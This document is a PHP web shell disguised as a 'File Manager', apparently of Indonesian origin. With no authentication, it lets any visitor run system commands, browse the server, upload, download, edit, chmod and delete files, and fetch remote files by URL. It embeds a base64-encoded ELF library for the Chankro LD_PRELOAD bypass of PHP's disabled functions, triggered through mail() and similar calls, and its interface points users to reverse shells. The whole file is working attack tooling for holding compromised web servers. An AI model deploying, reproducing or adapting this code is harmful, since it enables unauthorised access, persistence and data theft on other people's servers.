<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Direktori dasar untuk tombol "Home"
$baseDir = __DIR__;

// Direktori saat ini dari parameter ?dir=
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;
if ($currentDir === false || !is_dir($currentDir)) {
    $currentDir = $baseDir; // Kembali ke baseDir jika path tidak valid
}

// Proses pencarian direktori
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['search_dir']) && !empty($_POST['dir_path'])) {
    $searchPath = realpath($_POST['dir_path']);
    if ($searchPath !== false && is_dir($searchPath)) {
        header('Location: ?dir=' . urlencode($searchPath));
        exit;
    } else {
        $msg = 'Error: Invalid directory path';
    }
}

// Fungsi untuk menjalankan perintah menggunakan proc_open melalui shell
function runTask($task, $dir) {
    if (function_exists('proc_open')) {
        $shell = '/bin/sh'; // Ganti dengan '/bin/bash' jika tersedia
        $descriptors = [
            0 => ["pipe", "r"], // stdin
            1 => ["pipe", "w"], // stdout
            2 => ["pipe", "w"]  // stderr
        ];
        $process = proc_open($shell, $descriptors, $pipes, $dir);
        if (is_resource($process)) {
            fwrite($pipes[0], $task . " 2>&1\n");
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            return "<pre>" . htmlspecialchars($output . $error) . "</pre>";
        }
    }
    return "<font color='red'>Task execution failed or disabled!</font>";
}

// Fungsi Chankro untuk bypass disable_functions
function runChankro($command, $dir) {
    $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';
    $cmdd = $command;
    $meterpreter = base64_encode($cmdd . " > test.txt");
    $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
    $host = $_SERVER['HTTP_HOST'];
    $script_path = $_SERVER['SCRIPT_NAME'];
    $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
    $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
    $viewCommandResult = '<hr><p>Result: <font color="black">base64: ' . $meterpreter . '</font><br>If no output appears, please check manually by opening <a href="' . $full_url . '">' . $full_url . '</a><br>Or you can check command with reverse shell script<br>Powered By @ HaxorSec</p>';

    // Tulis file chankro.so dan acpid.socket
    file_put_contents($dir . '/chankro.so', base64_decode($hook));
    file_put_contents($dir . '/acpid.socket', base64_decode($meterpreter));
    
    // Atur variabel lingkungan
    putenv('CHANKRO=' . $dir . '/acpid.socket');
    putenv('LD_PRELOAD=' . $dir . '/chankro.so');
    
    // Coba jalankan perintah melalui fungsi bypass
    $output = '';
    if (function_exists('mail')) {
        mail('a', 'a', 'a', 'a');
        $output = $viewCommandResult;
        $content = @file_get_contents($full_url);
        if ($content !== false) {
            $output .= "<pre>" . htmlspecialchars($content) . "</pre>";
        }
    } elseif (function_exists('mb_send_mail')) {
        mb_send_mail('a', 'a', 'a', 'a');
        $output = $viewCommandResult;
        $content = @file_get_contents($full_url);
        if ($content !== false) {
            $output .= "<pre>" . htmlspecialchars($content) . "</pre>";
        }
    } elseif (function_exists('error_log')) {
        error_log('a', 1, 'a');
        $output = $viewCommandResult;
        $content = @file_get_contents($full_url);
        if ($content !== false) {
            $output .= "<pre>" . htmlspecialchars($content) . "</pre>";
        }
    } elseif (function_exists('imap_mail')) {
        imap_mail('a', 'a', 'a');
        $output = $viewCommandResult;
        $content = @file_get_contents($full_url);
        if ($content !== false) {
            $output .= "<pre>" . htmlspecialchars($content) . "</pre>";
        }
    } else {
        $output = "<font color='red'>No bypass function available (mail, mb_send_mail, error_log, or imap_mail)!</font>";
    }
    
    return $output;
}

// Fungsi untuk mendapatkan daftar file
function getFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    $result = [];
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        $result[] = [
            'name' => $file,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? filesize($path) : 0,
            'perm' => substr(sprintf('%o', fileperms($path)), -4)
        ];
    }
    return $result;
}

// Fungsi untuk membuat breadcrumb
function getBreadcrumb($baseDir, $currentDir) {
    $parts = array_filter(explode('/', $currentDir));
    $path = '';
    $crumb = ['<a href="?dir=' . urlencode($baseDir) . '">Home</a>'];
    foreach ($parts as $part) {
        $path .= '/' . $part;
        $crumb[] = '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' / ', $crumb);
}

// Proses aksi
$msg = '';
$cmdOutput = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['search_dir'])) {
    try {
        if (isset($_POST['upload']) && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $target = $currentDir . '/' . basename($file['name']);
            if (move_uploaded_file($file['tmp_name'], $target)) {
                $msg = 'File uploaded successfully';
            } else {
                $msg = 'Failed to upload file';
            }
        } elseif (isset($_POST['url_upload']) && !empty($_POST['url']) && !empty($_POST['method'])) {
            $url = filter_var($_POST['url'], FILTER_SANITIZE_URL);
            $fileName = basename($url);
            $target = $currentDir . '/' . $fileName;
            if ($_POST['method'] === 'curl' && function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                curl_close($ch);
                if (file_put_contents($target, $data)) {
                    $msg = 'File downloaded successfully via cURL';
                } else {
                    $msg = 'Failed to download file via cURL';
                }
            } elseif ($_POST['method'] === 'wget') {
                $data = @file_get_contents($url);
                if ($data !== false && file_put_contents($target, $data)) {
                    $msg = 'File downloaded successfully via wget (using file_get_contents)';
                } else {
                    $msg = 'Failed to download file via wget: file_get_contents not supported or invalid URL';
                }
            } else {
                $msg = 'Selected method not available';
            }
        } elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
            $old = $currentDir . '/' . $_POST['old_name'];
            $new = $currentDir . '/' . $_POST['new_name'];
            if (rename($old, $new)) {
                $msg = 'Renamed successfully';
            } else {
                $msg = 'Failed to rename';
            }
        } elseif (isset($_POST['edit']) && !empty($_POST['file']) && isset($_POST['content'])) {
            $file = $currentDir . '/' . $_POST['file'];
            if (is_file($file) && file_put_contents($file, $_POST['content'])) {
                $msg = 'File edited successfully';
            } else {
                $msg = 'Failed to edit file';
            }
            header('Location: ?dir=' . urlencode($currentDir));
            exit;
        } elseif (isset($_POST['chmod']) && !empty($_POST['file']) && !empty($_POST['perm'])) {
            $file = $currentDir . '/' . $_POST['file'];
            $perm = octdec($_POST['perm']);
            if (chmod($file, $perm)) {
                $msg = 'Permissions changed successfully';
            } else {
                $msg = 'Failed to change permissions';
            }
        } elseif (isset($_POST['delete']) && !empty($_POST['file'])) {
            $file = $currentDir . '/' . $_POST['file'];
            if (is_file($file) && unlink($file)) {
                $msg = 'File deleted successfully';
            } elseif (is_dir($file) && rmdir($file)) {
                $msg = 'Folder deleted successfully';
            } else {
                $msg = 'Failed to delete';
            }
        } elseif (isset($_POST['command']) && !empty($_POST['command']) && !empty($_POST['cmd_method'])) {
            $command = trim($_POST['command']);
            if ($_POST['cmd_method'] === 'exec' && function_exists('exec')) {
                $output = [];
                $return_var = 0;
                exec($command . ' 2>&1', $output, $return_var);
                $cmdOutput = "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
            } elseif ($_POST['cmd_method'] === 'base64') {
                $encodedCommand = base64_encode($command);
                $decodedCommand = base64_decode($encodedCommand);
                if ($decodedCommand === $command) {
                    $cmdOutput = runTask($command, $currentDir);
                } else {
                    $cmdOutput = "<font color='red'>Base64 encoding/decoding error!</font>";
                }
            } elseif ($_POST['cmd_method'] === 'chankro') {
                $cmdOutput = runChankro($command, $currentDir);
            } else {
                $cmdOutput = "<font color='red'>Selected command method is disabled on this server!</font>";
            }
        }
    } catch (Exception $e) {
        $msg = 'Error: ' . $e->getMessage();
    }
}

// Mode edit: hanya tampilkan form edit jika parameter get_content ada
if (isset($_GET['get_content']) && is_file($currentDir . '/' . $_GET['get_content'])) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Edit File - File Manager</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            textarea { width: 100%; height: 400px; }
            .error { color: red; }
            .success { color: green; }
        </style>
    </head>
    <body>
        <h2>Edit File: <?php echo htmlspecialchars($_GET['get_content']); ?></h2>
        <?php if ($msg): ?>
            <p class="<?php echo strpos($msg, 'success') !== false ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($msg); ?>
            </p>
        <?php endif; ?>
        <form action="" method="post">
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['get_content']); ?>">
            <textarea name="content"><?php echo htmlspecialchars(file_get_contents($currentDir . '/' . $_GET['get_content'])); ?></textarea>
            <input type="submit" name="edit" value="Save">
        </form>
        <a href="?dir=<?php echo urlencode($currentDir); ?>">Back to File Manager</a>
    </body>
    </html>
    <?php
    exit;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .error { color: red; }
        .success { color: green; }
        .breadcrumb { margin-bottom: 10px; }
        textarea { width: 100%; height: 200px; }
        .action-form { display: inline-block; margin-right: 5px; }
        input[type="text"] { width: 100px; }
    </style>
</head>
<body>
    <h2>File Manager</h2>
    <div class="breadcrumb"><?php echo getBreadcrumb($baseDir, $currentDir); ?></div>
    <?php if ($msg): ?>
        <p class="<?php echo strpos($msg, 'success') !== false ? 'success' : 'error'; ?>">
            <?php echo htmlspecialchars($msg); ?>
        </p>
    <?php endif; ?>

    <!-- Form Pencarian Direktori -->
    <h3>Search Directory</h3>
    <form action="" method="post">
        <input type="text" name="dir_path" placeholder="Enter directory path (e.g., /home/u131317956/domains/unzah.com/public_html)" style="width: 300px;">
        <input type="submit" name="search_dir" value="Search">
    </form>

    <!-- Form Upload -->
    <h3>Upload File</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="upload" value="Upload">
    </form>
    <form action="" method="post">
        <input type="url" name="url" placeholder="Enter URL" style="width: 300px;">
        <select name="method">
            <option value="curl">cURL</option>
            <option value="wget">wget (file_get_contents)</option>
        </select>
        <input type="submit" name="url_upload" value="Download">
    </form>

    <!-- Command System -->
    <h3>System Command</h3>
    <form action="" method="post">
        <input type="text" name="command" style="width: 300px;" placeholder="Enter command (e.g., ls -la, export RHOST=...)">
        <select name="cmd_method">
            <option value="exec">exec</option>
            <option value="base64">base64 (proc_open)</option>
            <option value="chankro">Chankro</option>
        </select>
        <input type="submit" value="Execute">
    </form>
    <?php if ($cmdOutput): ?>
        <?php echo $cmdOutput; ?>
    <?php endif; ?>

    <!-- Jarak antara System Command dan List Dir -->
    <div style="margin-bottom: 20px;"></div>

    <!-- Daftar File -->
    <table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
        <?php foreach (getFiles($currentDir) as $item): ?>
            <tr>
                <td>
                    <?php if ($item['type'] === 'dir'): ?>
                        <a href="?dir=<?php echo urlencode($currentDir . '/' . $item['name']); ?>">
                            <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($item['name']); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $item['type']; ?></td>
                <td><?php echo $item['size'] ? number_format($item['size']) . ' bytes' : '-'; ?></td>
                <td><?php echo $item['perm']; ?></td>
                <td>
                    <!-- Form Delete -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="submit" name="delete" value="Delete">
                    </form>
                    <!-- Form Rename -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="text" name="new_name" value="<?php echo htmlspecialchars($item['name']); ?>" style="width: 80px;">
                        <input type="submit" name="rename" value="Rename">
                    </form>
                    <!-- Form Chmod -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="text" name="perm" value="<?php echo $item['perm']; ?>" style="width: 50px;" placeholder="0755">
                        <input type="submit" name="chmod" value="Chmod">
                    </form>
                    <?php if ($item['type'] === 'file'): ?>
                        <!-- Tombol Edit -->
                        <a href="?get_content=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($currentDir); ?>">
                            <button>Edit</button>
                        </a>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>